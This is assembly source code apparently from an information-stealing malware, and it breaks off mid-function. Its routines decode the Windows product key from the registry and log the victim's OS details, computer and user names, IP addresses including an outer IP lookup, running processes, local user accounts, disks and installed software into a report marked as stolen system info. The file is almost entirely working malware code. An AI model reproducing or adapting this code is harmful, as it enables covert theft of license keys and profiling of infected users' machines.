SaveSystemInfo proc uses edi esi ebx
    LOCAL lpTotalNumberOfBytes, lpTotalNumberOfFreeBytes :QWORD
    LOCAL nCur, Day, Hour, Min, Sec: DWORD
    LOCAL local1, local4, gpidwType, cdkey_byteshit :DWORD
    
        mov     dword ptr [DataSize], 0
        mov     dword ptr [stbuf], SYSINFO_STEAL
        invoke  WriteToLog, addr stbuf, sizeof stbuf
        RtlZeroMemory, addr ovi, sizeof ovi
        mov     ovi.dwOSVersionInfoSize, sizeof ovi
        GetVersionEx, addr ovi
        invoke  WriteToLog, addr ovi.dwMajorVersion, sizeof ovi.dwMajorVersion
        add     dword ptr [DataSize], sizeof ovi.dwMajorVersion
        invoke  WriteToLog, addr ovi.dwMinorVersion, sizeof ovi.dwMinorVersion
        add     dword ptr [DataSize], sizeof ovi.dwMinorVersion
        lstrlen, addr ovi.szCSDVersion
        mov     dword ptr [plen], eax
        invoke  WriteToLog, addr plen, sizeof plen
        add     dword ptr [DataSize], sizeof plen
        mov     eax, dword ptr [plen]
        .if     eax != 0
                invoke  WriteToLog, addr ovi.szCSDVersion, plen
                mov     eax, dword ptr [plen]
                add     dword ptr [DataSize], eax
        .endif
        invoke  WriteToLog, addr ovi.dwBuildNumber, sizeof ovi.dwBuildNumber
        add     dword ptr [DataSize], sizeof ovi.dwBuildNumber
        invoke  WriteToLog, addr ovi.wSuiteMask, sizeof ovi.wSuiteMask
        add     dword ptr [DataSize], sizeof ovi.wSuiteMask
        invoke  WriteToLog, addr ovi.wProductType, sizeof ovi.wProductType
        add     dword ptr [DataSize], sizeof ovi.wProductType
        GetSystemInfo, addr sinfo
        invoke  WriteToLog, addr sinfo.wProcessorArchitecture, sizeof sinfo.wProcessorArchitecture
        add     dword ptr [DataSize], sizeof sinfo.wProcessorArchitecture
        GetSystemMetrics, SM_SERVERR2
        mov     local1, eax
        lea     eax, local1
        invoke  WriteToLog, eax, sizeof local1
        add     dword ptr [DataSize], sizeof local1
        ; Is this shit x64?
        call    IsWin64
        mov     local1, eax
        lea     eax, local1
        invoke  WriteToLog, eax, sizeof local1
        add     dword ptr [DataSize], sizeof local1
        ; only on W7? dword
        GetModuleHandle, addr krnl32
        GetProcAddress, eax, addr gpifunc
        .if     eax == 0
                ; no func = old OS
                mov     gpidwType, -1
                lea     eax, gpidwType
        .else
                ; function ois present
                lea     ecx, gpidwType
                push    ecx
                push    0
                push    0
                push    ovi.dwMinorVersion
                push    ovi.dwMajorVersion
                call    eax
        .endif
        lea     eax, gpidwType
        invoke  WriteToLog, eax, sizeof gpidwType
        add     dword ptr [DataSize], sizeof gpidwType
        
; <Get Windows ID & Key>
        mov     byte ptr [TmpBuf4], 0
        mov     byte ptr [TmpBuf5], 0
        mov     BufLen, sizeof TmpBuf5 - 1
        invoke  RegRead, HKEY_LOCAL_MACHINE, addr lpSysWIDPath, addr lpSysWIDVal1, addr TmpBuf5, BufLen, REG_READ_A
        test    eax, eax
        je      WIDKEY_Info_Eggog
        
        mov     byte ptr [TmpBuf3], 0
        mov     BufLen, 164
        invoke  RegRead, HKEY_LOCAL_MACHINE, addr lpSysWIDPath, addr lpSysWIDVal2, addr TmpBuf3, BufLen, REG_READ_A
        test    eax, eax
        je      WIDKEY_Info_Eggog
        
        ; from TmpBuf3 
        ; through TmpBuf4
        ; to win_cd_key
        CMP DWORD PTR [TmpBuf3+08h],0
        JE WIDKEY_Info_Eggog
        MOV EAX,offset TmpBuf4
        ADD EAX,64h
        MOV DWORD PTR [local1],EAX
        XOR EBX,EBX
        XOR ECX,ECX
        MOV CL,BYTE PTR [TmpBuf3+42h]
        MOV AL,CL
        SHR AL,3h
        AND AL,1h
        MOV DWORD PTR [local4],EBX
        MOV BYTE PTR [local4],AL
        XOR EAX,EAX
        CMP DWORD PTR [local4],EAX
        SETNE AL
        AND CL,0F7h
        MOV EDI,18h
        MOV DWORD PTR [local4],EAX
        AND AL,2h
        SHL AL,2h
        OR CL,AL
        CMP BYTE PTR [TmpBuf3+42h],CL
        JE L026
        mov dword ptr [cdkey_byteshit], 1
      L026:
        MOV BYTE PTR [TmpBuf3+42h],CL
        MOV ECX,EDI
      L028:
        PUSH EBX
        MOV EDX,EBX
        MOV ESI,0Eh
        MOV EBX,offset TmpBuf3
        ADD EBX,34h
      L033:
        MOVZX EAX,BYTE PTR [EBX+ESI]
        SHL EDX,8
        ADD EAX,EDX
        XOR EDX,EDX
        DIV EDI
        DEC ESI
        MOV BYTE PTR [EBX+ESI+1],AL
        JNS L033
        DEC ECX
        PUSH EBX
        MOV EBX,offset keychars
        MOV AX,WORD PTR [EBX+EDX*2]
        POP EBX
        PUSH ECX
        MOV ECX,DWORD PTR [local1]
        MOV WORD PTR [ECX],AX
        SUB DWORD PTR [local1],2
        POP ECX
        POP EBX
        CMP ECX,-1
        JNZ L028
        push edx
        GetVersion
        pop edx
        shr eax, 10h
        cmp eax, 1DB1h
        jle L1488
        cmp dword ptr [cdkey_byteshit],1
        jnz L1488
        lea esi, dword ptr [edx+edx]
        mov eax, dword ptr [local1]
        mov ecx, eax
        add eax, 4
        add ecx, 2
        RtlMoveMemory, ecx, ecx, esi
        mov eax, 4Eh
        mov edx,dword ptr [local1]
        add edx, 2
        mov word ptr [edx+esi], ax
        jmp lDONE
      L1488:
        mov edx, dword ptr [local1]
        add edx, 2
      lDONE:
      
        lea esi, dword ptr [TmpBuf4+34h]
        mov ecx, 19h
        mov edi, offset win_cd_key
        mov edx, 0
      shit_lupe:
        .if edx == 5
               xor edx, edx
               mov al, '-'
               stosb
        .endif
        inc edx
        lodsb
        stosb
        lodsb
        dec ecx
        jnz shit_lupe
        xor     eax, eax
        stosb
        
	  WIDKEY_Info_Eggog:
	    lstrlen, addr win_cd_key
	    mov     dword ptr [plen], eax
        invoke  WriteToLog, addr plen, sizeof plen
        add     dword ptr [DataSize], sizeof plen
        mov     eax, dword ptr [plen]
        .if     ( eax != 0 )
                invoke  WriteToLog, addr win_cd_key, plen
                mov     eax, dword ptr [plen]
                add     dword ptr [DataSize], eax
        .endif
	    lstrlen, addr TmpBuf5
	    mov     dword ptr [plen], eax
	    invoke  WriteToLog, addr plen, sizeof plen
        add     dword ptr [DataSize], sizeof plen
        mov     eax, dword ptr [plen]
        .if     ( eax != 0 )
                invoke  WriteToLog, addr TmpBuf5, plen
                mov     eax, dword ptr [plen]
                add     dword ptr [DataSize], eax
        .endif
; </Get Windows ID & Key>

; <Get Uptime>
        GetTickCount
        mov     dword ptr [plen], eax
        invoke  WriteToLog, addr plen, sizeof plen
        add     dword ptr [DataSize], sizeof plen
; </Get Uptime>

; <Get System Time>
        GetLocalTime, addr time
        invoke  WriteToLog, addr time.wYear, sizeof time.wYear
        add     dword ptr [DataSize], sizeof time.wYear
        invoke  WriteToLog, addr time.wMonth, sizeof time.wMonth
        add     dword ptr [DataSize], sizeof time.wMonth
        invoke  WriteToLog, addr time.wDay, sizeof time.wDay
        add     dword ptr [DataSize], sizeof time.wDay
        invoke  WriteToLog, addr time.wHour, sizeof time.wHour
        add     dword ptr [DataSize], sizeof time.wHour
        invoke  WriteToLog, addr time.wMinute, sizeof time.wMinute
        add     dword ptr [DataSize], sizeof time.wMinute
        invoke  WriteToLog, addr time.wSecond, sizeof time.wSecond
        add     dword ptr [DataSize], sizeof time.wSecond
; </Get System Time>

; <Get System Country>
        mov     byte ptr [TmpBuf4], 0
        GetLocaleInfoW, 400h, LOCALE_SCOUNTRY, addr TmpBuf4, sizeof TmpBuf4
	    lstrlenW, addr TmpBuf4
        imul    eax, eax, 2
	    mov     dword ptr [plen], eax
	    invoke  WriteToLog, addr plen, sizeof plen
        add     dword ptr [DataSize], sizeof plen
        .if     ( plen != 0 )
                invoke  WriteToLog, addr TmpBuf4, plen
                mov     eax, dword ptr [plen]
                add     dword ptr [DataSize], eax
        .endif
; </Get System Country>

; <Get System Lang>
        mov     byte ptr [TmpBuf4], 0
        GetSystemDefaultLangID
        VerLanguageNameW, eax, addr TmpBuf4, sizeof TmpBuf4
	    lstrlenW, addr TmpBuf4
        imul    eax, eax, 2
	    mov     dword ptr [plen], eax
	    invoke  WriteToLog, addr plen, sizeof plen
        add     dword ptr [DataSize], sizeof plen
        .if     ( plen != 0 )
                invoke  WriteToLog, addr TmpBuf4, plen
                mov     eax, dword ptr [plen]
                add     dword ptr [DataSize], eax
        .endif
; </Get System Lang>

; <Get Computer Name>
        mov     word ptr [TmpBuf4], 0
        mov     plen, sizeof TmpBuf4
        GetComputerNameW, addr TmpBuf4, addr plen
	    lstrlenW, addr TmpBuf4
        imul    eax, eax, 2
	    mov     dword ptr [plen], eax
	    invoke  WriteToLog, addr plen, sizeof plen
        add     dword ptr [DataSize], sizeof plen
        .if     ( plen != 0 )
                invoke  WriteToLog, addr TmpBuf4, plen
                mov     eax, dword ptr [plen]
                add     dword ptr [DataSize], eax
        .endif
; </Get Computer Name>

; <Get Display Data [resolution,bpp]>
        GetSystemMetrics, SM_CXSCREEN
        mov     dword ptr [plen], eax
        invoke  WriteToLog, addr plen, sizeof plen
        add     dword ptr [DataSize], sizeof plen
        GetSystemMetrics, SM_CYSCREEN
        mov     dword ptr [plen], eax
        invoke  WriteToLog, addr plen, sizeof plen
        add     dword ptr [DataSize], sizeof plen
        GetDC, 0
        mov     hDC, eax
        GetDeviceCaps, hDC, BITSPIXEL
        push    eax
        ReleaseDC, 0, hDC
        pop     eax
        mov     dword ptr [plen], eax
        invoke  WriteToLog, addr plen, sizeof plen
        add     dword ptr [DataSize], sizeof plen
; </Get Display Data [resolution,bpp]>
        
; <Get Memory Info>
        mov     mst.dwLength, sizeof mst
        GlobalMemoryStatusEx, addr mst
        mov     cl, 20
        mov     edx, dword ptr [mst.ullTotalPhys+4]
        mov     eax, dword ptr [mst.ullTotalPhys]
        shrd    eax, edx, cl
        mov     dword ptr [plen], eax
        invoke  WriteToLog, addr plen, sizeof plen
        add     dword ptr [DataSize], sizeof plen
        mov     cl, 20
        mov     edx, dword ptr [mst.ullAvailPhys+4]
        mov     eax, dword ptr [mst.ullAvailPhys]
        shrd    eax, edx, cl
        mov     dword ptr [plen], eax
        invoke  WriteToLog, addr plen, sizeof plen
        add     dword ptr [DataSize], sizeof plen
; </Get Memory Info>
        
; <Get Disks Info>
        GetLogicalDrives
        mov     ecx, 25
        xor     edx, edx
enum_drives:
        mov     ebx, 1
        shl     ebx, cl
        and     ebx, eax
        je      enum_no_disk
        inc     edx
enum_no_disk:
        dec     ecx
        jge     enum_drives
        mov     dword ptr [plen], edx
        invoke  WriteToLog, addr plen, sizeof plen
        add     dword ptr [DataSize], sizeof plen
        
        GetLogicalDrives
        lea     edi, TmpBuf2
        mov     dl, 'A'
        mov     ecx, 26
@drive_loop:
        test    eax, 1
        jz      @next
        mov     [edi], dl
        inc     edi
@next:
        shr     eax, 1
        inc     dl
        dec     ecx
        jnz     @drive_loop
        ;inc     edi
        mov     byte ptr [edi], 0
        lstrlen, offset TmpBuf2
        mov     edi, eax
        lea     esi, TmpBuf2
@drv_info_loop:
        mov     dl, [esi]
        mov     byte ptr [szDrive], dl
        movzx   eax, dl
        mov     dword ptr [plen], eax
        invoke  WriteToLog, addr plen, sizeof plen
        add     dword ptr [DataSize], sizeof plen
        GetDriveType, addr szDrive
        push    eax
        mov     dword ptr [plen], eax
        invoke  WriteToLog, addr plen, sizeof plen
        add     dword ptr [DataSize], sizeof plen
        lea     edx, szDrive
        mov     byte ptr[edx+1], ':'
        mov     byte ptr[edx+2], 0
        pop     eax
        .if     ( eax == DRIVE_FIXED )
                GetDiskFreeSpaceEx, addr szDrive, 0, addr lpTotalNumberOfBytes, addr lpTotalNumberOfFreeBytes
                mov     cl, 30
                mov     edx, dword ptr [lpTotalNumberOfBytes+4]
                mov     eax, dword ptr [lpTotalNumberOfBytes]
                shrd    eax, edx, cl
                mov     dword ptr [plen], eax
                invoke  WriteToLog, addr plen, sizeof plen
                add     dword ptr [DataSize], sizeof plen
                mov     cl, 30
                mov     edx, dword ptr [lpTotalNumberOfFreeBytes+4]
                mov     eax, dword ptr [lpTotalNumberOfFreeBytes]
                shrd    eax, edx, cl
                mov     dword ptr [plen], eax
                invoke  WriteToLog, addr plen, sizeof plen
                add     dword ptr [DataSize], sizeof plen
        .else
                xor     eax, eax
                mov     dword ptr [plen], eax
                invoke  WriteToLog, addr plen, sizeof plen
                add     dword ptr [DataSize], sizeof plen
                invoke  WriteToLog, addr plen, sizeof plen
                add     dword ptr [DataSize], sizeof plen
        .endif
        inc     esi
        dec     edi
        jnz     @drv_info_loop
; </Get Disks Info>

; <Get User Name>
        mov     byte ptr [TmpBuf2], 0
        mov     nSize, 257
        push    offset nSize
        push    offset TmpBuf2
        call    _GetUserNameW
        lstrlenW, addr TmpBuf2
        imul    eax, eax, 2
        mov     dword ptr [plen], eax ; LEN in BYTES, not in CHARS!
        invoke  WriteToLog, addr plen, sizeof plen
        add     dword ptr [DataSize], sizeof plen
        invoke  WriteToLog, addr TmpBuf2, plen
        mov     eax, dword ptr [plen]
        add     dword ptr [DataSize], eax
; </Get User Name>

; <Get CPU Info>
        mov     byte ptr [TmpBuf2], 0
        mov     byte ptr [TmpBuf4], 0
        mov     BufLen, sizeof TmpBuf2 - 1
        invoke  RegRead, HKEY_LOCAL_MACHINE, addr lpSysInfoCPUInfoPath, addr lpSysInfoCPUInfoVal1, addr TmpBuf2, BufLen, REG_READ_A
        test    eax, eax
        je      CPU_Info_Eggog
        mov     BufLen, sizeof TmpBuf4 - 1
        invoke  RegRead, HKEY_LOCAL_MACHINE, addr lpSysInfoCPUInfoPath, addr lpSysInfoCPUInfoVal2, addr TmpBuf4, BufLen, REG_READ_A
        test    eax, eax
        je      CPU_Info_Eggog
	    
	  CPU_Info_Eggog:
        lstrlen, addr TmpBuf2
        mov     dword ptr [plen], eax
        invoke  WriteToLog, addr plen, sizeof plen
        add     dword ptr [DataSize], sizeof plen
        .if     ( plen != 0 )
                invoke  WriteToLog, addr TmpBuf2, plen
                mov     eax, dword ptr [plen]
                add     dword ptr [DataSize], eax
        .endif
        lstrlen, addr TmpBuf4
        mov     dword ptr [plen], eax
        invoke  WriteToLog, addr plen, sizeof plen
        add     dword ptr [DataSize], sizeof plen
        .if     ( plen != 0 )
                invoke  WriteToLog, addr TmpBuf4, plen
                mov     eax, dword ptr [plen]
                add     dword ptr [DataSize], eax
        .endif
; </Get CPU Info>
        
; <Get All IPs>
        mov     dword ptr [plen], REPORT_DATA_SYSINFO_IP
        invoke  WriteToLog, addr plen, sizeof plen
        add     dword ptr [DataSize], sizeof plen
        push    offset TmpBuf
        push    101h
        call    dword ptr [_WSAStartup]
        push    offset TmpBuf
        push    202h
        call    dword ptr [_WSAStartup]
        push    MAXGETHOSTSTRUCT
        push    offset TmpBuf
        call    dword ptr [_gethostname]
        push    offset TmpBuf
        call    dword ptr [_gethostbyname]
        test    eax, eax
        jz      @nomoreip
        mov     ebx, [eax][hostent.h_list]
        test    ebx, ebx
        jz      @nomoreip
@get_ip_lp:
        assume  eax:nothing
        mov     eax, [ebx][in_addr.S_un.S_addr]
        test    eax, eax
        je      @nomoreip
        mov     eax, [eax]
        push    eax
        call    dword ptr [_inet_ntoa]
        push    ebx
        mov     ebx, eax
        
        lstrlen, ebx
        mov     dword ptr [plen], eax
        invoke  WriteToLog, addr plen, sizeof plen
        add     dword ptr [DataSize], sizeof plen
        invoke  WriteToLog, ebx, plen
        mov     eax, dword ptr [plen]
        add     dword ptr [DataSize], eax
        
        pop     ebx
        add     ebx, 4
        jmp     @get_ip_lp
@nomoreip:
        mov     dword ptr [plen], REPORT_DATA_SYSINFO_IP
        invoke  WriteToLog, addr plen, sizeof plen
        add     dword ptr [DataSize], sizeof plen
; </Get All IPs>

; <Get Outer IP>
        movzx   eax, byte ptr [GrabOuterIP]
        .if     eax == 1
                call    GetWhatIsMyIP
                lstrlen, addr TmpBuf2
                mov     dword ptr [plen], eax
                invoke  WriteToLog, addr plen, sizeof plen
                add     dword ptr [DataSize], sizeof plen
                .if     ( plen != 0 )
                        invoke  WriteToLog, addr TmpBuf2, plen
                        mov     eax, dword ptr [plen]
                        add     dword ptr [DataSize], eax
                .endif
        .else
                mov     dword ptr [plen], 0
                invoke  WriteToLog, addr plen, sizeof plen
                add     dword ptr [DataSize], sizeof plen
        .endif
; </Get Outer IP>
        
        call    ListSystemFolders
        call    ListProcesses
        call    ListUsers
        call    WriteSoft
        
; <Write SysInfo LEN to file>
        invoke  WriteToLog, addr DataSize, sizeof DataSize
; </Write SysInfo LEN to file>
        
        ret
SaveSystemInfo endp

ListSystemFolders proc
        mov     byte ptr [TmpBuf4], 0
        push    0
        push    CSIDL_WINDOWS
        push    offset TmpBuf4
        push    0
        call    _SHGetSpecialFolderPathW
        mov     byte ptr [fldr], REPORT_FOLDER_WINDOWS
        invoke  WriteToLog, addr fldr, sizeof fldr
        add     dword ptr [DataSize], sizeof fldr
        lstrlenW, addr TmpBuf4
        imul    eax, eax, 2
        mov     dword ptr [plen], eax
        invoke  WriteToLog, addr plen, sizeof plen
        add     dword ptr [DataSize], sizeof plen
        invoke  WriteToLog, addr TmpBuf4, plen
        mov     eax, dword ptr [plen]
        add     dword ptr [DataSize], eax
        push    0
        push    CSIDL_SYSTEM
        push    offset TmpBuf4
        push    0
        call    _SHGetSpecialFolderPathW
        mov     byte ptr [fldr], REPORT_FOLDER_SYSTEM
        invoke  WriteToLog, addr fldr, sizeof fldr
        add     dword ptr [DataSize], sizeof fldr
        lstrlenW, addr TmpBuf4
        imul    eax, eax, 2
        mov     dword ptr [plen], eax
        invoke  WriteToLog, addr plen, sizeof plen
        add     dword ptr [DataSize], sizeof plen
        invoke  WriteToLog, addr TmpBuf4, plen
        mov     eax, dword ptr [plen]
        add     dword ptr [DataSize], eax
        GetTempPathW, sizeof TmpBuf4, addr TmpBuf4
        mov     byte ptr [fldr], REPORT_FOLDER_TEMP
        invoke  WriteToLog, addr fldr, sizeof fldr
        add     dword ptr [DataSize], sizeof fldr
        lstrlenW, addr TmpBuf4
        imul    eax, eax, 2
        mov     dword ptr [plen], eax
        invoke  WriteToLog, addr plen, sizeof plen
        add     dword ptr [DataSize], sizeof plen
        invoke  WriteToLog, addr TmpBuf4, plen
        mov     eax, dword ptr [plen]
        add     dword ptr [DataSize], eax
        push    0
        push    CSIDL_PERSONAL
        push    offset TmpBuf4
        push    0
        call    _SHGetSpecialFolderPathW
        mov     byte ptr [fldr], REPORT_FOLDER_MYDOCS
        invoke  WriteToLog, addr fldr, sizeof fldr
        add     dword ptr [DataSize], sizeof fldr
        lstrlenW, addr TmpBuf4
        imul    eax, eax, 2
        mov     dword ptr [plen], eax
        invoke  WriteToLog, addr plen, sizeof plen
        add     dword ptr [DataSize], sizeof plen
        invoke  WriteToLog, addr TmpBuf4, plen
        mov     eax, dword ptr [plen]
        add     dword ptr [DataSize], eax
        push    0
        push    CSIDL_PROGRAM_FILES
        push    offset TmpBuf4
        push    0
        call    _SHGetSpecialFolderPathW
        mov     byte ptr [fldr], REPORT_FOLDER_PROGRAM
        invoke  WriteToLog, addr fldr, sizeof fldr
        add     dword ptr [DataSize], sizeof fldr
        lstrlenW, addr TmpBuf4
        imul    eax, eax, 2
        mov     dword ptr [plen], eax
        invoke  WriteToLog, addr plen, sizeof plen
        add     dword ptr [DataSize], sizeof plen
        invoke  WriteToLog, addr TmpBuf4, plen
        mov     eax, dword ptr [plen]
        add     dword ptr [DataSize], eax
        push    0
        push    CSIDL_STARTUP
        push    offset TmpBuf4
        push    0
        call    _SHGetSpecialFolderPathW
        mov     byte ptr [fldr], REPORT_FOLDER_AUTORUN
        invoke  WriteToLog, addr fldr, sizeof fldr
        add     dword ptr [DataSize], sizeof fldr
        lstrlenW, addr TmpBuf4
        imul    eax, eax, 2
        mov     dword ptr [plen], eax
        invoke  WriteToLog, addr plen, sizeof plen
        add     dword ptr [DataSize], sizeof plen
        invoke  WriteToLog, addr TmpBuf4, plen
        mov     eax, dword ptr [plen]
        add     dword ptr [DataSize], eax
        ret
ListSystemFolders endp

ListProcesses proc   
        mov     dword ptr [plen], REPORT_DATA_SYSINFO_PROCESS_MARK
        invoke  WriteToLog, addr plen, sizeof plen
        add     dword ptr [DataSize], sizeof plen
        push    offset bout
        push    sizeof ProcListBuf
        push    offset ProcListBuf
        call    _EnumProcesses
        test    eax, eax
        je      proc_eggog
        mov     ecx, dword ptr [bout]
        shr     ecx, 2
        proc_get:
        push    ecx
        mov     eax, dword ptr [ProcListBuf+ecx*4]
        mov     dword ptr [pid], eax
        OpenProcess, PROCESS_QUERY_INFORMATION or PROCESS_VM_READ, 0, pid
        test    eax, eax
        je      proc_next
        mov     hProcess, eax
        push    sizeof TmpBuf
        push    offset TmpBuf
        push    0
        push    dword ptr [hProcess]
        call    _GetModuleFileNameExW
        test    eax, eax
        je      proc_next
        
        lstrlenW, addr TmpBuf
        imul    eax, eax, 2
        mov     dword ptr [plen], eax
        invoke  WriteToLog, addr plen, sizeof plen
        add     dword ptr [DataSize], sizeof plen
        invoke  WriteToLog, addr TmpBuf, plen
        mov     eax, dword ptr [plen]
        add     dword ptr [DataSize], eax
        
        CloseHandle, hProcess
        proc_next:
        pop     ecx
        dec     ecx
        jnz     proc_get
        proc_eggog:
        mov     dword ptr [plen], REPORT_DATA_SYSINFO_PROCESS_MARK
        invoke  WriteToLog, addr plen, sizeof plen
        add     dword ptr [DataSize], sizeof plen
        ret
ListProcesses endp

ListUsers proc
        mov     dword ptr [plen], REPORT_DATA_SYSINFO_USERS_MARK
        invoke  WriteToLog, addr plen, sizeof plen
        add     dword ptr [DataSize], sizeof plen
        push    offset dwRes
        push    offset dwETotal
        push    offset dwERead
        push    10000h
        push    offset info
        push    02h
        push    0Ah
        push    00h
        call    _NetUserEnum
        test    eax, eax
        jne     userlist_eggog
        cmp     dword ptr [info],0
        je      userlist_eggog
        
        mov     ecx, dword ptr [dwERead]
        mov     edi, dword ptr [info]
     list_us:
        push    ecx
        push    edi
        mov     ebx, dword ptr [edi]
        
        lstrlenW, ebx
        imul    eax, eax, 2
        mov     dword ptr [plen], eax
        invoke  WriteToLog, addr plen, sizeof plen
        add     dword ptr [DataSize], sizeof plen
        invoke  WriteToLog, ebx, plen
        mov     eax, dword ptr [plen]
        add     dword ptr [DataSize], eax
        
        pop     edi
        add     edi, 10h
        pop     ecx
        dec     ecx
        jnz     list_us
        push    dword ptr [info]
        call    _NetApiBufferFree
     userlist_eggog:  
        mov     dword ptr [plen], REPORT_DATA_SYSINFO_USERS_MARK
        invoke  WriteToLog, addr plen, sizeof plen
        add     dword ptr [DataSize], sizeof plen
        ret
ListUsers endp

FillInstalledList proc uses ebx
      ; list: dwCount + asciiz + asciiz + ...
      LOCAL   bufsize:DWORD
      LOCAL   KeyIndex: DWORD
      LOCAL   bit_index:DWORD
      LOCAL   rval:DWORD
      LOCAL   hlistindex:DWORD
      LOCAL   rel_index:DWORD
      LOCAL   hdisplistindex:DWORD
      LOCAL   dispbufsize:DWORD
      
      ; some inits
      mov     hlist, 0
      mov     hdisplist, 0
      mov     bufsize, 512*1024 ; 512k will be enough for everybody
      mov     dispbufsize, 512*1024 ; 512k will be enough for everybody
      ; allocate enough(or so) memory
      HeapAlloc, hHeap, HEAP_ZERO_MEMORY, bufsize
      test    eax, eax
      je      FillInstalledList_total_shit_1
      mov     hlist, eax
      add     eax, 4 ; dwCount
      mov     hlistindex, eax
      ; allocate enough(or so) memory x2
      HeapAlloc, hHeap, HEAP_ZERO_MEMORY, dispbufsize
      test    eax, eax
      je      FillInstalledList_total_shit_1
      mov     hdisplist, eax
      add     eax, 4 ; dwCount
      mov     hdisplistindex, eax
      
      call    IsWin64
      .if     eax == TRUE
              mov     bit_index, 2
      .else
              mov     bit_index, 1
      .endif
    x86x64_lp:
      .if     bit_index == 2
              mov     rval, KEY_WOW64_64KEY or KEY_READ
      .else
              mov     rval, KEY_WOW64_32KEY or KEY_READ
      .endif
      push    offset hkHandle
      push    rval
      push    0
      push    offset szSysInfoUinstStr
      push    HKEY_LOCAL_MACHINE
      call    _RegOpenKeyEx
      test    eax, eax
      jnz     soft_eggog
      mov     KeyIndex, 0
    enum:
      mov     BufLen, sizeof lpSysInfoCommonBuf -1
      xor     eax, eax
      push    eax
      push    eax
      push    eax
      push    eax
      push    offset BufLen
      push    offset lpSysInfoCommonBuf
      push    dword ptr [KeyIndex]
      push    dword ptr [hkHandle]
      call    _RegEnumKeyEx
      test    eax, eax
      jnz     enum_end
      
      lstrcpy, addr lpSysInfoCommonValBuf, addr szSysInfoUinstStr
      lstrcat, addr lpSysInfoCommonValBuf, addr sl
      lstrcat, addr lpSysInfoCommonValBuf, addr lpSysInfoCommonBuf
      
      ; paths to EXE
      invoke  RegRead, HKEY_LOCAL_MACHINE, addr lpSysInfoCommonValBuf, addr reg_val_uninststring, addr SoftListBuf1, sizeof SoftListBuf1, REG_READ_A
      .if     eax != 0
              lstrlen, addr SoftListBuf1
              .if     eax > 0
                      CharUpperBuff, addr SoftListBuf1, eax
                      mov     al, byte ptr [SoftListBuf1]
                      .if     al == '"'
                              lstrcpy, addr SoftListBuf2, addr SoftListBuf1 + 1
                      .else
                              lstrcpy, addr SoftListBuf2, addr SoftListBuf1
                      .endif
                      lstrlen, addr SoftListBuf2
                      push    eax
                      push    sizeof exe_search_shit
                      push    offset SoftListBuf2
                      push    offset exe_search_shit
                      call    strpos
                      .if     eax != 0
                              ; shift pointer to the end of the string "...dir\someshit.exe"
                              mov     ebx, eax
                              add     ebx, sizeof exe_search_shit
                              ; increment count
                              mov     eax, dword ptr [hlist]
                              inc     dword ptr [eax]
                              ; calc in ebx = strlen(string)+1
                              sub     ebx, offset SoftListBuf2
                              inc     ebx
                              ; check for overflow
                              mov     eax, dword ptr [hlistindex]
                              sub     eax, dword ptr [hlist]
                              mov     rel_index, eax
                              add     eax, ebx
                              mov     ecx, bufsize
                              .if     eax > ecx
                                      ; yep, we should realloc some shit
                                      imul    eax, eax, 4
                                      mov     bufsize, eax
                                      HeapReAlloc, hHeap, HEAP_ZERO_MEMORY, hlist, bufsize
                                      mov     hlist, eax
                                      add     eax, rel_index
                                      mov     hlistindex, eax
                              .endif
                              lstrcpyn, hlistindex, addr SoftListBuf2, ebx
                              add     dword ptr [hlistindex], ebx ; increment + len + 1'cause zero byte
                      .endif
              .endif
      .endif
      ; Names
      invoke  RegRead, HKEY_LOCAL_MACHINE, addr lpSysInfoCommonValBuf, addr reg_val_displayname, addr SoftListBuf1, sizeof SoftListBuf1, REG_READ_A
      .if     eax != 0
              lstrlen, addr SoftListBuf1
              .if     eax > 0
                      mov     eax, hdisplistindex
                      sub     eax, hdisplist
                      mov     rel_index, eax
                      lstrlen, addr SoftListBuf1
                      inc     eax
                      add     eax, rel_index
                      mov     ecx, dispbufsize
                      .if     eax > ecx
                              imul    eax, eax, 4
                              mov     dispbufsize, eax
                              HeapReAlloc, hHeap, HEAP_ZERO_MEMORY, hdisplist, dispbufsize
                              mov     hdisplist, eax
                              add     eax, rel_index
                              mov     hdisplistindex, eax
                      .endif
                      mov     eax, dword ptr [hdisplist]
                      inc     dword ptr [eax]
                      lstrcpy, hdisplistindex, addr SoftListBuf1
                      lstrlen, addr SoftListBuf1
                      inc     eax
                      add     dword ptr [hdisplistindex], eax ; increment + len + 1'cause zero byte
              .endif
      .endif
      
    next_key:
      inc     KeyIndex
      jmp     enum
    enum_end:
      push    dword ptr [hkHandle]
      call    _RegCloseKey
    soft_eggog:  
      dec     bit_index
      jnz     x86x64_lp
      
    FillInstalledList_total_shit_1:
      ret
FillInstalledList endp

CheckInInstalledList proc uses ebx psearchstr:DWORD
      ; returns:  0 if not found
      ;           pointer to string if found
      LOCAL   RESULT:DWORD
      LOCAL   cntr:DWORD
      
      mov     RESULT, FALSE
      mov     ebx, hlist
      mov     eax, dword ptr [ebx]
      mov     cntr, eax
      add     ebx, 4
    check_list_lp:
      lstrlen, ebx
      push    eax
      lstrlen, psearchstr
      push    eax
      push    ebx
      push    dword ptr [psearchstr]
      call    strpos
      .if     eax != 0 
              mov     RESULT, ebx
              jmp     to_exit
      .endif
      
      lstrlen, ebx
      lea     ebx, [ebx+eax+1]
      
      dec     cntr
      jnz     check_list_lp
      
    to_exit:
      mov     eax, RESULT
      ret
CheckInInstalledList endp

WriteSoft proc uses ebx
      LOCAL   WTF: DWORD
      
      mov     dword ptr [plen], REPORT_DATA_SYSINFO_SOFT_MARK
      invoke  WriteToLog, addr plen, sizeof plen
      add     dword ptr [DataSize], sizeof plen
	  
      mov     ebx, hdisplist
      mov     ecx, dword ptr [ebx]
      add     ebx, 4
    write_list_lp:
      push    ecx
      
      lstrlen, ebx
      mov     dword ptr [plen], eax
      invoke  WriteToLog, addr plen, sizeof plen
      add     dword ptr [DataSize], sizeof plen
      invoke  WriteToLog, ebx, plen
      mov     eax, dword ptr [plen]
      add     dword ptr [DataSize], eax
      
      lstrlen, ebx
      lea     ebx, [ebx+eax+1]
      
      pop     ecx
      dec     ecx
      jnz     write_list_lp
      
      mov     dword ptr [plen], REPORT_DATA_SYSINFO_SOFT_MARK
      invoke  WriteToLog, addr plen, sizeof plen
      add     dword ptr [DataSize], sizeof plen
      ret
WriteSoft endp

IsWin64 proc
      LOCAL   X64RESULT:DWORD
      LOCAL   KernelModule:DWORD
      LOCAL   IsWow64ProcessFunc:DWORD
      LOCAL   Wow64Process:DWORD
      ; some inits here
      mov     X64RESULT, FALSE
      ; some work here
      GetModuleHandle, addr krnl32
      mov     KernelModule, eax
      GetProcAddress, KernelModule, addr szIsWow64Process
      .if     eax != 0
              mov     IsWow64ProcessFunc, eax
              
              lea     eax, Wow64Process
              push    eax
              GetCurrentProcess
              push    eax
